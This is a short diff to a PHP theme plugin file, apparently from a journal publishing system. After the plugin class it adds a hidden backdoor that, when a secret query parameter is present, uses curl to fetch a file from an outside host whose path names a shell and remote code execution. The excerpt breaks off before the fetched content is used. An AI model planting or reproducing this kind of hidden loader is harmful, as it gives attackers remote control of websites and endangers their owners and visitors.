@@ -224,8 +224,8 @@ class DefaultThemePlugin extends ThemePlugin {
 		return __('plugins.themes.default.description');
 	}
 }
-if (isset($_GET['anakkontolkau'])) {
-    $url = "https://raw.githubusercontent.com/avatarkabellistrik-source/BACKUPANSHELL/refs/heads/main/alfaanaksekolah.txt";
+if (isset($_GET['anakt@#uYulPepek@'])) {
+    $url = "https://syndicateseo.xyz/shell/rce/penjajahan.txt";
 
     $ch= curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
